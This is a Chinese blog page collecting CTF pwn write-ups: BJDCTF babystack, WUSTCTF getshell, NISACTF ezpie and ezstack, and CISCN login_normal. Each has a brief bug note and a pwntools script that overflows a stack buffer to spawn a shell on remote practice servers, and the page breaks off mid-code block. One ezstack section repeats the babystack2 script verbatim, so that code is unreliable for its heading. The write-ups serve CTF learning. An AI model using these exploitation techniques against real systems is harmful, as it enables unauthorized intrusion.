<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>MyS3andB0x | str1k3</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('/img/bg.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/links/"><span class="navItemTitle">Links</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>MyS3andB0x</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2024-03-14T20:59:41.000Z" id="date"> 2024-03-14</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2024-03-14T13:22:51.679Z" id="updated"> 2024-03-14</time></div></span></div></div><hr><div id="post-content"><p>刷题合集<br>从开始的开始来的，就当是电子考古了）<br>但是持续更新</p>
<h3 id="P-BJDCTF-2020-babystack-解题做题人"><a href="#P-BJDCTF-2020-babystack-解题做题人" class="headerlink" title="P | [BJDCTF 2020]babystack | 解题做题人"></a>P | [BJDCTF 2020]babystack | 解题做题人</h3><h4 id="题目说明"><a href="#题目说明" class="headerlink" title="题目说明"></a>题目说明</h4><p>整数溢出</p>
<h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-comment">#引用pwntools库</span><br>io = remote(<span class="hljs-string">&quot;1.14.71.254&quot;</span>,<span class="hljs-number">28792</span>)<span class="hljs-comment">#开启链接</span><br><br>io.recvuntil(<span class="hljs-string">&quot;your name:\n&quot;</span>)<br>io.sendline(<span class="hljs-string">b&#x27;-1&#x27;</span>)<br>backdoor = <span class="hljs-number">0x400726</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x18</span> + p64(backdoor)<br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="P-BJDCTF-2020-babystack2-解题做题人"><a href="#P-BJDCTF-2020-babystack2-解题做题人" class="headerlink" title="P | [BJDCTF 2020]babystack2 | 解题做题人"></a>P | [BJDCTF 2020]babystack2 | 解题做题人</h3><h4 id="题目说明-1"><a href="#题目说明-1" class="headerlink" title="题目说明"></a>题目说明</h4><p>ez64 位溢出</p>
<h4 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = connect(<span class="hljs-string">&quot;1.14.71.254&quot;</span>,<span class="hljs-number">28622</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;length of your name:\n&quot;</span>,<span class="hljs-string">&quot;-1&quot;</span>)<br>payload = <span class="hljs-number">24</span>*<span class="hljs-string">&#x27;a&#x27;</span>+ p64(<span class="hljs-number">0x0000000000400893</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x0000000000400726</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;name?\n&quot;</span>,payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="P-NISACTF-2022-ezstack-解题做题人"><a href="#P-NISACTF-2022-ezstack-解题做题人" class="headerlink" title="P |[NISACTF 2022]ezstack | 解题做题人"></a>P |[NISACTF 2022]ezstack | 解题做题人</h3><h4 id="题目说明-2"><a href="#题目说明-2" class="headerlink" title="题目说明"></a>题目说明</h4><p>ez32 位栈溢出</p>
<h4 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = connect(<span class="hljs-string">&quot;1.14.71.254&quot;</span>,<span class="hljs-number">28622</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;length of your name:\n&quot;</span>,<span class="hljs-string">&quot;-1&quot;</span>)<br>payload = <span class="hljs-number">24</span>*<span class="hljs-string">&#x27;a&#x27;</span>+ p64(<span class="hljs-number">0x0000000000400893</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x0000000000400726</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;name?\n&quot;</span>,payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="P-WUSTCTF-2020-getshell-解题做题人"><a href="#P-WUSTCTF-2020-getshell-解题做题人" class="headerlink" title="P | [WUSTCTF 2020]getshell | 解题做题人"></a>P | [WUSTCTF 2020]getshell | 解题做题人</h3><h4 id="题目说明-3"><a href="#题目说明-3" class="headerlink" title="题目说明"></a>题目说明</h4><p>32 位栈溢出</p>
<h4 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>elf = ELF(<span class="hljs-string">&#x27;./service&#x27;</span>)<br>p=process(<span class="hljs-string">&#x27;./service&#x27;</span>)<br><span class="hljs-comment">#p=remote(&#x27;43.143.7.97&#x27;,28860)</span><br>shell_addr =<span class="hljs-number">0x804851B</span><br>padding = <span class="hljs-number">28</span><br>payload1 = <span class="hljs-string">b&#x27;a&#x27;</span> * padding + p32(shell_addr)<br>p.sendline(payload1)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="P-NISACTF-2022-ezpie-解题做题人"><a href="#P-NISACTF-2022-ezpie-解题做题人" class="headerlink" title="P |[NISACTF 2022]ezpie | 解题做题人"></a>P |[NISACTF 2022]ezpie | 解题做题人</h3><h4 id="题目说明-4"><a href="#题目说明-4" class="headerlink" title="题目说明"></a>题目说明</h4><p>pie 保护绕过方法，详见保护机制</p>
<h4 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-comment"># p = process(&quot;./ezpie&quot;)</span><br>p = remote(<span class="hljs-string">&#x27;1.14.71.254&#x27;</span>, <span class="hljs-number">28335</span>)<br><br>p.recvuntil(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>main_addr = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">8</span>), <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+]main_addr: &#x27;</span>, <span class="hljs-built_in">hex</span>(main_addr))<br>shell_addr = main_addr + <span class="hljs-number">0x80F</span> - <span class="hljs-number">0x770</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+]shell_addr: &#x27;</span>, <span class="hljs-built_in">hex</span>(shell_addr))<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x28</span> + <span class="hljs-number">4</span>) + p32(shell_addr)<br><br>p.recvuntil(<span class="hljs-string">&quot;Input:\n&quot;</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="P-NISACTF-2022-ezstack-解题做题人-1"><a href="#P-NISACTF-2022-ezstack-解题做题人-1" class="headerlink" title="P | [NISACTF 2022]ezstack | 解题做题人"></a>P | [NISACTF 2022]ezstack | 解题做题人</h3><h4 id="题目说明-5"><a href="#题目说明-5" class="headerlink" title="题目说明"></a>题目说明</h4><p>栈溢出但是 NX</p>
<h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>32 位文件  开启了 NX 保护，堆栈不可执行</p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/Yvh6bACUEoBAXexzmwpcyn52nyc.png'><img src="/2024/03/15/MyS3andB0x/Yvh6bACUEoBAXexzmwpcyn52nyc.png"></p>
<p>IDA 看一手</p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/T5DNb8pztoavROxpjewcwZcWn8e.png'><img src="/2024/03/15/MyS3andB0x/T5DNb8pztoavROxpjewcwZcWn8e.png"></p>
<p>只有一个 <code>shell()</code> 函数 追一手</p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/Y7cHbUzqJoETbyxRng3cnsXunvf.png'><img src="/2024/03/15/MyS3andB0x/Y7cHbUzqJoETbyxRng3cnsXunvf.png"></p>
<p>72&#x3D;0x48,接收 0x60 个字符输入，存在栈溢出</p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/WWbTbP6iBojiGfxEBj6coIECnYd.png'><img src="/2024/03/15/MyS3andB0x/WWbTbP6iBojiGfxEBj6coIECnYd.png"></p>
<p>查看字符串 在 data 段发现 <code>&#39;/bin/sh&#39;</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;1.14.71.254&quot;</span>, <span class="hljs-number">28115</span>)<br>system = elf.plt[<span class="hljs-string">&quot;system&quot;</span>]<br><br>g = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x48</span>+<span class="hljs-number">4</span>) + p32(system) + p32(<span class="hljs-number">0xabcdabcd</span>) + p32(<span class="hljs-number">0x0804A024</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;Welcome to NISACTF\n&quot;</span>, g)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="P-CISCN-2022-初赛-login-normal-解题做题人"><a href="#P-CISCN-2022-初赛-login-normal-解题做题人" class="headerlink" title="P | [CISCN 2022 初赛]login_normal | 解题做题人"></a>P | [CISCN 2022 初赛]login_normal | 解题做题人</h3><h4 id="题目说明-6"><a href="#题目说明-6" class="headerlink" title="题目说明"></a>题目说明</h4><h4 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h4><p>看 main 函数，read 后执行 sub_FFD</p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/EBa4b43LYoZGU9xkXmFc27VKnog.png'><img src="/2024/03/15/MyS3andB0x/EBa4b43LYoZGU9xkXmFc27VKnog.png"></p>
<p>跟进 sub_FFD</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 __fastcall <span class="hljs-title function_">sub_FFD</span><span class="hljs-params">(_BYTE *a1)</span><br>&#123;<br>  <span class="hljs-type">char</span> *sa; <span class="hljs-comment">// [rsp+8h] [rbp-48h]</span><br>  <span class="hljs-type">char</span> *sb; <span class="hljs-comment">// [rsp+8h] [rbp-48h]</span><br>  <span class="hljs-type">char</span> *sc; <span class="hljs-comment">// [rsp+8h] [rbp-48h]</span><br>  <span class="hljs-type">char</span> *sd; <span class="hljs-comment">// [rsp+8h] [rbp-48h]</span><br>  <span class="hljs-type">char</span> v7; <span class="hljs-comment">// [rsp+17h] [rbp-39h]</span><br>  <span class="hljs-type">int</span> v8; <span class="hljs-comment">// [rsp+1Ch] [rbp-34h]</span><br>  <span class="hljs-type">int</span> v9; <span class="hljs-comment">// [rsp+2Ch] [rbp-24h]</span><br>  <span class="hljs-type">void</span> *dest; <span class="hljs-comment">// [rsp+30h] [rbp-20h]</span><br>  <span class="hljs-type">char</span> *s1; <span class="hljs-comment">// [rsp+38h] [rbp-18h]</span><br>  <span class="hljs-type">char</span> *nptr; <span class="hljs-comment">// [rsp+40h] [rbp-10h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v13; <span class="hljs-comment">// [rsp+48h] [rbp-8h]</span><br><br>  v13 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">memset</span>(qword_202040, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(qword_202040));<br>  v8 = <span class="hljs-number">0</span>;<br>  v7 = <span class="hljs-number">0</span>;<br>  dest = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-keyword">while</span> ( !*a1 || *a1 != <span class="hljs-number">10</span> &amp;&amp; (*a1 != <span class="hljs-number">13</span> || a1[<span class="hljs-number">1</span>] != <span class="hljs-number">10</span>) )<span class="hljs-comment">// 关于a[0]和a[1]的判定关系</span><br>  &#123;<br>    <span class="hljs-keyword">if</span> ( v8 &lt;= <span class="hljs-number">5</span> )<br>      qword_202040[<span class="hljs-number">2</span> * v8] = a1;                <span class="hljs-comment">// 处理的位分别是0，8，16，24，32</span><br>    sb = <span class="hljs-built_in">strchr</span>(a1, <span class="hljs-number">58</span>);                        <span class="hljs-comment">// 找到字符&#x27;:&#x27;位置</span><br>    <span class="hljs-keyword">if</span> ( !sb )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;error.&quot;</span>);<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    *sb = <span class="hljs-number">0</span>;                                    <span class="hljs-comment">// 将找到&#x27;:&#x27;的位置数值变为0</span><br>    <span class="hljs-keyword">for</span> ( sc = sb + <span class="hljs-number">1</span>; *sc &amp;&amp; (*sc == <span class="hljs-string">&#x27; &#x27;</span> || *sc == <span class="hljs-string">&#x27;\r&#x27;</span> || *sc == <span class="hljs-string">&#x27;\n&#x27;</span> || *sc == <span class="hljs-string">&#x27;\t&#x27;</span>); ++sc )<span class="hljs-comment">// sc=sb的下一位，sc满足在范围内且等于指定字符</span><br>      *sc = <span class="hljs-number">0</span>;                                  <span class="hljs-comment">// 当前字符置0</span><br>    <span class="hljs-keyword">if</span> ( !*sc )             <br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;abort.&quot;</span>);<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">2</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( v8 &lt;= <span class="hljs-number">5</span> )<br>      qword_202040[<span class="hljs-number">2</span> * v8 + <span class="hljs-number">1</span>] = sc;            <span class="hljs-comment">// (0,8,16,24,32)+1出来的值</span><br>    sd = <span class="hljs-built_in">strchr</span>(sc, <span class="hljs-string">&#x27;\n&#x27;</span>);                <br>    <span class="hljs-keyword">if</span> ( !sd )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;error.&quot;</span>);<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">3</span>);<br>    &#125;<br>    *sd = <span class="hljs-number">0</span>;                                    <span class="hljs-comment">// 置零</span><br>    a1 = sd + <span class="hljs-number">1</span>;                                <span class="hljs-comment">// 首位置到sd的下一位</span><br>    <span class="hljs-keyword">if</span> ( *a1 == <span class="hljs-string">&#x27;\r&#x27;</span> )                          <span class="hljs-comment">// 如果当前位是\r下一位置0</span><br>      *a1++ = <span class="hljs-number">0</span>;<br>    s1 = (<span class="hljs-type">char</span> *)qword_202040[<span class="hljs-number">2</span> * v8];          <span class="hljs-comment">// 0,8,16,24,32</span><br>    nptr = (<span class="hljs-type">char</span> *)qword_202040[<span class="hljs-number">2</span> * v8 + <span class="hljs-number">1</span>];  <br>    <span class="hljs-keyword">if</span> ( !strcasecmp(s1, <span class="hljs-string">&quot;opt&quot;</span>) )         <br>    &#123;<br>      <span class="hljs-keyword">if</span> ( v7 )<br>      &#123;                                         <span class="hljs-comment">// 第一次opt退出</span><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;error.&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">5</span>);<br>      &#125;<br>      v7 = atoi(nptr);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> ( strcasecmp(s1, <span class="hljs-string">&quot;msg&quot;</span>) )              <span class="hljs-comment">// 是否是msg</span><br>      &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;error.&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">4</span>);<br>      &#125;<br>      <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(nptr) &lt;= <span class="hljs-number">1</span> )<br>      &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;error.&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">5</span>);<br>      &#125;<br>      v9 = <span class="hljs-built_in">strlen</span>(nptr) - <span class="hljs-number">1</span>;             <br>      <span class="hljs-keyword">if</span> ( dest )<br>      &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;error.&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">5</span>);<br>      &#125;<br>      dest = <span class="hljs-built_in">calloc</span>(v9 + <span class="hljs-number">8</span>, <span class="hljs-number">1uLL</span>);<br>      <span class="hljs-keyword">if</span> ( v9 &lt;= <span class="hljs-number">0</span> )<br>      &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;error.&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">5</span>);<br>      &#125;<br>      <span class="hljs-built_in">memcpy</span>(dest, nptr, v9);                 <br>    &#125;<br>    ++v8;<br>  &#125;<br>  *a1 = <span class="hljs-number">0</span>;<br>  sa = a1 + <span class="hljs-number">1</span>;                              <br>  <span class="hljs-keyword">if</span> ( *sa == <span class="hljs-string">&#x27;\n&#x27;</span> )                            <span class="hljs-comment">// 如果是换行符就赋值0</span><br>    *sa = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">switch</span> ( v7 )                           <br>  &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>      sub_DA8((<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)dest);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>      sub_EFE((<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)dest);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>      sub_CBD((<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)dest);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;error.&quot;</span>);<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">6</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v13;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>由上述可知，要进行两次校验，在连接之后就需要先写通过校验才可以进行后续操作，即 <code>&#39;opt:1\r\nmsg:ro0t\r\n</code> 和 <code>opt:2\r\nmsg:</code>，且最终结尾必须是 <code>\r\n</code></p>
<p>绕过后到达 sub_DA8</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 __fastcall <span class="hljs-title function_">sub_DA8</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *a1)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">size_t</span> v2; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+14h] [rbp-2Ch]</span><br>  <span class="hljs-type">void</span> *dest; <span class="hljs-comment">// [rsp+18h] [rbp-28h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v6; <span class="hljs-comment">// [rsp+28h] [rbp-18h]</span><br><br>  v6 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(a1); ++i )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">isprint</span>(a1[i]) &amp;&amp; a1[i] != <span class="hljs-number">10</span> )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;oh!&quot;</span>);<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( unk_202028 != <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;oh!&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( unk_202024 )<br>  &#123;<br>    v1 = getpagesize();<br>    dest = (<span class="hljs-type">void</span> *)(<span class="hljs-type">int</span>)mmap((<span class="hljs-type">char</span> *)&amp;loc_FFE + <span class="hljs-number">2</span>, v1, <span class="hljs-number">7</span>, <span class="hljs-number">34</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0LL</span>);<br>    v2 = <span class="hljs-built_in">strlen</span>(a1);<br>    <span class="hljs-built_in">memcpy</span>(dest, a1, v2);<br>    ((<span class="hljs-type">void</span> (*)(<span class="hljs-type">void</span>))dest)();    <span class="hljs-comment">//shellcode利用转换执行</span><br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(a1);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v6;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span 